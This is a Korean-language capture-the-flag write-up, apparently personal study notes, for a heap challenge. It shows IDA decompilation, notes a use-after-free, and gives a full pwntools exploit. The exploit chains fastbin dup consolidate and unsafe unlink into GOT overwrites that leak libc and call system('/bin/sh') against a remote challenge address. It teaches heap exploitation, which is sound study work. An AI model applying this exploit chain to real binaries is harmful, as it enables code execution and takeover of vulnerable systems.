## Unsafe Unlink

---

### unlink

fast bin을 제외한 나머지 bin들은 앞 뒤에 free chunk가 존재한다면, 이를 병합하여 관리하는 기능이 있다.

이때, 이들은 double linked list 라는 특성을 가지고 있음으로 fd, bk에 적힌 값을 정리해주어야 하는데, 이 정리해주는 과정을 우리는 unlink라고 한다.

즉, 정리하자면 **인접한 두 free chunk를 병합할 때 fd, bk에 올바른 값으로 교체해주는 작업이다.**

이를 이용한 기법인 unsafe unlink를 살펴보자.

https://rninche01.tistory.com/entry/heap-exploit-Unsafe-Unlink

## fastbin dup consolidate

---

https://dolphinlmg.tistory.com/32

## IDA

---

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  unsigned int buf; // [rsp+4h] [rbp-1Ch] BYREF
  int fd; // [rsp+8h] [rbp-18h]
  int v6; // [rsp+Ch] [rbp-14h]
  char s[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  sub_400CEB(a1, a2, a3);
  puts("Waking Sleepy Holder up ...");
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  buf &= 0xFFFu;                                // and 연산?
  malloc(buf);
  sleep(3u);
  puts("Hey! Do you have any secret?");
  puts("I can help you to hold your secrets, and no one will be able to see it :)");
  while ( 1 )
  {
    puts("1. Keep secret");
    puts("2. Wipe secret");
    puts("3. Renew secret");
    memset(s, 0, 4uLL);
    read(0, s, 4uLL);
    v3 = atoi(s);
    v6 = v3;
    switch ( v3 )
    {
      case 2:
        free_func();
        break;
      case 3:
        renew_func();
        break;
      case 1:
        malloc_func();
        break;
    }
  }
}
```

전체 코드이다. 함수 하나씩 살펴보자

### alloc_func

- alloc_func c code
    
    ```c
    unsigned __int64 sub_40093D()
    {
      int v0; // eax
      char s[8]; // [rsp+10h] [rbp-10h] BYREF
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      puts("What secret do you want to keep?");
      puts("1. Small secret");
      puts("2. Big secret");
      if ( !flag_huge )
        puts("3. Keep a huge secret and lock it forever");
      memset(s, 0, 4uLL);
      read(0, s, 4uLL);ㄴ
      v0 = atoi(s);
      if ( v0 == 2 )                                // big
      {
        if ( !flag_big )
        {
          big_chunk = calloc(1uLL, 4000uLL);
          flag_big = 1;                             // double free 불가능 할듯?
          puts("Tell me your secret: ");
          read(0, big_chunk, 4000uLL);
        }
      }
      else if ( v0 == 3 )                           // huge
      {
        if ( !flag_huge )
        {
          huge_chunk = calloc(1uLL, 400000uLL);     // huge chunk의 주소가 적힘 -> use 가능
          flag_huge = 1;
          puts("Tell me your secret: ");
          read(0, huge_chunk, 400000uLL);
        }
      }
      else if ( v0 == 1 && !flag_small )            // small
      {
        buf = calloc(1uLL, 0x28uLL);                // buf -> bss의 전역변수
        flag_small = 1;
        puts("Tell me your secret: ");
        read(0, buf, 0x28uLL);
      }
      return __readfsqword(0x28u) ^ v3;
    }
    ```
    
    특이점
    
    1. huge는 한 번 할당한 후엔 더 이상 Puts로도 출력이 되지 않는다. 딱 한 번 결정적이게 쓰일 것 같다.
    2. 할당할 수 있는 크기들이 다들 정해져있다. 각 값들이 어느 bin에 들어가는지 확인할 필요가 있을 것 같다.
    3. 각 비밀 당 할당을 한 번씩, 총 3번만 가능하다.
    4. 40만..? 할당의 역할은 정말 뭘까
    5. chunk가 적히는 주소가 고정되어있다.
    6. Flag의 주소가 청크가 적히는 주소 근처의 bss영역으로 ‘**굳이**’ 되어있다.
    
    취약점
    
    1. 주소를 매개로 하여 값을 쓰는 read함수들이 존재한다. 이를 이용하여 got overwrite를 진행할 수도 있을 것 같다. (각 주소에 적힌 주소를 바꾸어서)
    2. 각 chunk들의 주소가 bss영역에 각각 적힌다. 적히는 주소가 크기마다 정해져있다.
    
    제한 사항
    
    1. calloc 함수로 할당을 해줌으로, 할당을 해준 다음 남아 있는 값을 출력해주는 방식은 불가능 할 듯.
    2. 할당을 위한 flag가 각각 존재하기 때문에, 무조건 free가 선행되어 있는 상태에서만 할당이 가능하다는 것.

### free_func

- free_func c code
    
    ```c
    	unsigned __int64 sub_400B01()
    {
      int v0; // eax
      char s[8]; // [rsp+10h] [rbp-10h] BYREF
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      puts("Which Secret do you want to wipe?");
      puts("1. Small secret");
      puts("2. Big secret");
      memset(s, 0, 4uLL);
      read(0, s, 4uLL);
      v0 = atoi(s);
      if ( v0 == 1 )
      {
        free(buf);                                  // 값을 없애지 않음 -> UAF
        flag_small = 0;
      }
      else if ( v0 == 2 )
      {
        free(big_chunk);
        flag_big = 0;
      }
      return __readfsqword(0x28u) ^ v3;
    }
    ```
    
    특이점
    
    1. huge 사이즈로 할당된 것을 free해주는 곳이 없다. 따라서 해당 사이즈의 할당은 어떠한 과정을 위한 수단으로 존재하지 않을까 생각해볼 수 있다.
    
    취약점
    
    1. free를 해준 뒤, chunk의 주소들이 쓰이는 주소의 값을 초기화해주지 않는다. 따라서 UAF 취약점을 이용할 수 있다.
    
    제한점
    
    1. 딱히…?

### renew_func

- renew_func
    
    ```c
    unsigned __int64 sub_400BD0()
    {
      int v0; // eax
      char s[8]; // [rsp+10h] [rbp-10h] BYREF
      unsigned __int64 v3; // [rsp+18h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      puts("Which Secret do you want to renew?");
      puts("1. Small secret");
      puts("2. Big secret");
      memset(s, 0, 4uLL);
      read(0, s, 4uLL);
      v0 = atoi(s);
      if ( v0 == 1 )
      {
        if ( flag_small )
        {
          puts("Tell me your secret: ");
          read(0, buf, 0x28uLL);                    // 주소를 매개로 값을 쓰니까 got overwrite를 이용해줄 수도 있겠음
        }
      }
      else if ( v0 == 2 && flag_big )
      {
        puts("Tell me your secret: ");
        read(0, big_chunk, 4000uLL);
      }
      return __readfsqword(0x28u) ^ v3;
    	}
    ```
    
    특이점
    
    1. 여기 또한 huge를 다루는 부분이 존재하지 않는다. 크게 한 방 역할하고 안 쓸 것 같다는 생각이 굳어진다.
    
    취약점
    
    1. 고정된 (bss)주소를 매개로 하여 값을 쓰는 read함수들이 존재한다. 이들을 이용하여 got overwrite가 가능하지 않을까? → double free를 해줄 수 있다면 참 좋을텐데… 우회적 double free 같은 게 또 있지 않을려나?
    
    제한점
    
    1. 역시나 flag가 설정되어있다. 따라서 할당 전, 그리고 프리 후에는 해당 함수를 사용하지 못하게 되었다. 모든 것들은 할당 후 진행하도록 익스 계획을 짜야 할 것 같다.

## S**cenario**

---

### frist

- fastbin dup consolidate라는 기법을 알아내서, double free느낌처럼 동일한 chunk를 두 번 할당 가능하게 . 근데 문제는 이 문제도 망할 calloc을 쓴다는거지. 때문에 일반적으로 double free를 하여 fd값을 조작하는 방법으로는 익스가 불가능하고, 때문에 unsafe unlink를 이용해보아야겠다고 생각함.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/57749aec-4422-4d95-b493-aa606e04dfbb/71dbf6cd-534a-444e-99b6-87efb683c177/Untitled.png)

해당 bss영역을 살펴보면 

```
# bss fake fd : 0x6020b8 -> 이러면 여기부터 chunk시작일 때, 
# small bss가 fd, bk의 역할을 할 수 있음
# small bss : 0x6020d0
# big bss : 0x6020c0
# huge bss : 0x6020c8
```

으로 정해져있다. 여기를 통해 어떻게든 해보자..

### 전체 exploit code

```python
from pwn import *
#p = process('./sf9')
p = remote('182.213.154.20', 21008)
e = ELF('./sf9')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def alloc(size, content) :
    sleep(0.2)
    p.sendlineafter('\n', '1')
    p.sendlineafter('\n', str(size))
    p.sendafter('\n', content)
    sleep(0.2)

def delete(index) :
    sleep(0.2)
    p.sendlineafter('\n', '2')
    p.sendlineafter('\n', str(index))
    sleep(0.2)

def renew(index, content) :
    sleep(0.2)
    p.sendlineafter('\n', '3')
    p.sendlineafter('\n', str(index))
    p.sendafter('\n', content)

free_got = 0x602018
read_got = 0x602040
puts_got = 0x602020
puts_plt = 0x400760
atoi_got = 0x602080

fake = ''
fake += p64(0) # prev size
fake += p64(0) # size
fake += p64(0x6020b8)
fake += p64(0x6020c0)
fake += p64(0x20) 

##### fastbin dup consolidate ####
alloc(1, 'aaaa')
alloc(2, 'bbbb')
delete(1)
alloc(3, 'cccc')
delete(1)
alloc(1, fake)
delete(2)
##################################

pay = ''
pay += 'aaaaaaaa'
pay += p64(atoi_got) # big
pay += p64(puts_got) # huge
pay += p64(free_got) # small 
pay += p64(0x0000000100000001)
pay += p64(0x0000000000000001)
renew(1, pay) ## 처음에 alloc으로 했다가 안 됨을 깨닫

renew(1, p64(puts_plt)) # free got /<-/ puts_plt 
delete(2) # free start
leak = u64(p.recvuntil("\x7f")[-6:] + "\x00\x00")
libc_base = leak - libc.symbols["atoi"]
system = libc_base + libc.symbols["system"]
print(hex(system))
renew(1, p64(system)) # free got /<-/ system
alloc(2, '/bin/sh\x00')
delete(2) #-> not perfect execute.... Try it yourself

##size bypass addr : 0x601f08

p.interactive()
```

### 쓰인 기법들 (익스 순서대로)

- fastbin dup consolidate & unsafe unlink
    
    ```python
    fake = ''
    fake += p64(0) # prev size
    fake += p64(0) # size
    fake += p64(0x6020b8)
    fake += p64(0x6020c0)
    fake += p64(0x20) #big chunk의 prev size
    
    alloc(1, 'aaaa')
    alloc(2, 'bbbb')
    delete(1)
    alloc(3, 'cccc')
    delete(1)
    alloc(1, fake)
    delete(2)
    ```
    
    fastbin dup consolidate. 위에 첨부해놓은 블로그를 보면 수월히 이해할 수 있을 것이다.
    
    여기서 다시 짧막히 정리해보자면, fastbin 크기의 청크를 small bin으로 들어갈 수 있게 함으로써 double free 효과를 낼 수 있는 방식이다.
    
    여타한 문제들과 동일하게, 전역 변수로 설정되어있는 부분에 청크들의 주소가 적히었고, 그 남겨진 주소들을 이용하는 방식으로 풀어야겠다고 생각할 수 있었다.
    
    문제는 그 곳까지 접근하는 방식이였는데, 전에 쓰였던 fastbin attack의 경우는 불가능하였다.
    
    해당 문제의 경우 alloc을 해주는 부분, 즉 비밀을 만들어내는 함수에 alloc과 free에 flag를 도입하여 중복 할당이나 프리가 불가능하게 되어 있었기 때문에, 일반적인 double free는 불가능하였다. 
    
    heap overflow가 나는 부분도 없었기에, fd값 조작도 불가능하여서 주어진 청크들 안에서 조작을 통한 exploit만 가능했다.
    
    이러한 조건을 만족시키는 기법이 unsafe unlink였지만 한 가지 문제점은 존재했다.
    
    바로 INUSE_FLAG를 조작하지 못 한다는 것이였는데, 이는 보통 해당 기법을 쓸 때 쓰이던 heap overflow가 존재하지 않아서 생긴 문제였다.
    
    우리는 이를 해결해주기 위해서 double free를 생각, 따라서 fastbin dup consolidate를 쓸 수 있다.
    
    flag가 설정되어 있을 때, 동일하지 않는 청크들을 alloc해줌으로써 double free를 일으킬 수 있는 기법이므로 이를 이용하여 할당된 청크임에도 INUSE_FLAG = 0으로 설정될 수 있도록 하였다.
    
    ```python
    fake = ''
    fake += p64(0) # prev size
    fake += p64(0) # size
    fake += p64(0x6020b8) #fd
    fake += p64(0x6020c0) #bk
    fake += p64(0x20) #big chunk의 prev size
    ```
    
    해당 변수가 unsafe unlink에 쓰이는 변수인데, 위의 두 부분을 0으로 세팅하여 앞의 청크 사이즈 = 0, 자신도 = 0 이 되게 한 후, 익스하고자 하며 우회가 가능한 주소가 적혀있는 위치의 주소 -24, -16 위치의 주소값을 적어주었다. 마지막으론 해당 청크 바로 밑에 존재하는 big chunk의 prev size를 0x20으로 설정하여 사이즈 체크 시 우회가 가능하도록 하였다.
    
    ```python
    alloc(1, 'aaaa')
    alloc(2, 'bbbb')
    delete(1)
    alloc(3, 'cccc')
    delete(1)
    ## 여기까지 fastbin dup consolidate
    
    alloc(1, fake)
    delete(2)
    
    ## unsafe unlink
    ```
    
    따라서 이를 fastbin dup consolidate와 함께 써주면 위와 같이 되며, 마지막 delete(2)를 해줌으로서 unsafe unlink 기법을 써준다.
    
    그럼, 따라서 
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/57749aec-4422-4d95-b493-aa606e04dfbb/88a55e38-519f-4ec2-a839-c3ca889e095f/Untitled.png)
    
    0x6020d0, 원래 small secret 청크의 주소가 적혀야할 부분에 0x6020b8의 주소가 적힘으로서, 해당 자리 (bss)에 값을 쓸 수 있게 되었다.
    
- got overwrite
    
    ```python
    pay = ''
    pay += 'aaaaaaaa'
    pay += p64(atoi_got) # big
    pay += p64(puts_got) # huge
    pay += p64(free_got) # small 
    pay += p64(0x0000000100000001)
    pay += p64(0x0000000000000001)
    renew(1, pay) ## 처음에 alloc으로 했다가 안 됨을 깨닫
    ```
    
    그럼 우린 small secret부분에 적힌 0x6020b8을 통하여 해당 bss자리를 마음대로 다룰 수 있게 되었다. 
    
    처음에 alloc으로 하다가 calloc & 주소도 다시 덮어짐 이슈로 인해 renew를 이용하여 overwrite를 진행하였는데, 여기서 궁금한 점은
    
    <aside>
    ❓ fastbin 이외는 size check가 없나?
    
    </aside>
    
    처음에 이래서 할당을 새로해주어야 하나 고민을 했었는데 그냥 renew를 해주면 되긴 했었다.
    
    일단 각각의 청크 주소가 적히는 부분에다가 함수들의 got를 적어주었다. 쓰임은 차차 알아보도록 하자.
    
    그 다음, 밑에 존재하는 000..1…0.. 들은 flag이 저장되는 부분들이며, 이들을 1로 덮어씌워 할당을 하지 않아도 renew를 통해 항상 쓸 수 있도록, 또한 free가 가능하도록 만들어주었다.
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/57749aec-4422-4d95-b493-aa606e04dfbb/2d9bb3ae-7624-4320-a0f8-f5f93b5d498d/Untitled.png)
    
    쨘 
    
    그럼 예쁘게 잘 적힌다.
    
- libc leak & exploit
    
    ```python
    renew(1, p64(puts_plt)) # free got /<-/ puts_plt 
    delete(2) # free start
    
    leak = u64(p.recvuntil("\x7f")[-6:] + "\x00\x00")
    libc_base = leak - libc.symbols["atoi"]
    system = libc_base + libc.symbols["system"]
    
    renew(1, p64(system)) # free got /<-/ system
    alloc(2, '/bin/sh\x00')
    delete(2) #-> not perfect execute.... Try it yourself
    ```
    
    코드를 한 줄씩 살펴보자. 중요한 부분이다.
    
    ```python
    renew(1, p64(puts_plt)) # free got /<-/ puts_plt 
    delete(2) # free start
    ```
    
    free got안에 puts plt를 적어주는 과정이다.
    
    일단, 우리는 system주소를 활용하기 위해서 libc leak이 필요한데, 이를 위해서 필요한 것은
    
    1. puts 실행
    2. got 인자 주기
    
    두 과정이 필요하다.
    
    puts 함수의 got로 free got를 덮어버리면, 그냥 puts 만! 실행이 된다. 그럼 무슨 의미가 있겠는가.
    
    때문에 우선 small 부분에서 got overwrite를 일으켜 준다.
    
    그 후, big부분을 free 시켜줄 것이다.
    
    이때 프로그램은 이러한 과정을 거친다.
    
    **`free ( big _ bss ) 형태 → puts ( big _bss ) :[ got overwrite ]`**
    
    근데 여기서 big _ bss = atoi _ got이므로,
    
    **`puts ( big _ bss ) → puts ( atoi _ got )`** 이다.
    
    그렇담 puts 함수는 atoi got 내부에 있는 값을 출력해줄테고, 그 내부의 값은 atoi의 libc 주소일 것이다.
    
    와! 우리는 이로써 libc leak에 성공하였다. 다 끝난 것이나 마찬가지이다. 
    
    여기서 배워갈 중요한 개념은
    
    <aside>
    ⭐ 함수의 got를 plt로 overwrite 하면 인자를 줄 수 있도록 (그냥 함수 실행 과정이랑 완벽히 동일) 해줄 수 있으며, **덮힌 함수를 덮은 함수, 동일한 함수 그 자체로 바라볼 수 있다.**
    
    </aside>
    
    ```python
    renew(1, p64(system)) # free got /<-/ system
    alloc(2, '/bin/sh\x00')
    delete(2) #-> not perfect execute.... Try it yourself
    ```
    
    방금 전과 동일한 방식으로, 다시 free의 got부분을 system으로 바꾸어주고, alloc 을 이용하여 bin인자를 chunk에다 적은 후, (그냥 이 문자열만 존재하면 되니까) free를 진행해주면?
    
    **`free ( big _ bss ) → system ( big _ bss )`**
    
    이때 big _ bss에는 /bin/sh\x00이 존재함으로 우리는 exploit에 성공할 수 있게 된다.
    

---

fastbin dub

malloc(fast), malloc(small)

free(fast) → malloc(very 큰거) → free(fast) 

:이러면 small bin에 fast가 적힌다는 것 가틈

fack chunk 만들어주기 위해서 Pay 작성 후, malloc (fast)하면서 이걸 보내주고

free(4000)

read를 해줄 때 free got 랑 bss - 24 뒤에 1 값을 넣어주어야함.

free_got → put_plt → read_got

one_gadget 안 되니까 system으로 하기